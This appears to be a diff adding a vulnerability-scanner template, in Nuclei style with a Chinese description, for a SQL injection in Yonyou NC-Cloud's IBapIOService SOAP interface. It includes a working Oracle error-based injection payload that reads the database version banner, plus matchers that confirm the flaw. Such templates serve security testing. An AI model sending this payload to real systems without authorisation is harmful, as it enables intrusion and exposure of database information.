@@ -1,0 +1,42 @@
+id: yonyou-nccloud-ibapioservice-sqli
+
+info:
+  name: 用友NC-Cloud IBapIOService SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    用友NC-Cloud的IBapIOService接口存在SQL注入漏洞，攻击者可通过SOAP报文注入Oracle函数获取数据库信息
+  reference: UFIDA-2025-059739
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - method: POST
+    path: 
+      - "{{BaseURL}}/uapws/service/nc.itf.bap.service.IBapIOService"
+    headers:
+      Content-Type: "text/xml"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0"
+    body: |
+      <?xml version="1.0" encoding="UTF-8" standalone="no"?>
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
+          <soapenv:Header/>
+          <soapenv:Body>
+              <gs:getBapTableDatas>
+                  <gs:stringarrayItem>
+                      DWQueue@MessageQueue' AND 1=UTL_INADDR.GET_HOST_ADDRESS('~'||(SELECT banner FROM v$version WHERE rownum=1)||'~')-- abc
+                  </gs:stringarrayItem>
+              </gs:getBapTableDatas>
+          </soapenv:Body>
+      </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "~Oracle Database"
+          - "~ORA-"
+        condition: or
+        part: body
+      - type: status
+        status:
+          - 500
+
